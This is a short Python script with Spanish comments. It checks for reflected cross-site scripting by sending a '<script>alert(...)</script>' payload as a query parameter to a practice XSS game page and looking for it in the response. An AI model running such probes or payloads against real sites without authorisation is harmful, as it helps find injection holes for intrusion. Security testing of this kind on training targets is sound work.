import requests
# todo: mejorar el codigo 

def test_xss(url, parametro="q"):
    payload = "<script>alert('HELLO BUDDY')</script>"
    print(f'Enviando payload: a la url: {url}  {payload}' )
    
    try:
        res = requests.get(url, params={parametro: payload})
        if payload in res.text:
            print(f'XSS detectado en: {url}'  )
        else:
            print(f'No se detectó XSS en: {url}'  )
    except requests.exceptions.RequestException as e:
        print(f'Error al enviar la solicitud: {e}' )
        
test_xss("https://xss-game.appspot.com/level1/frame", "query")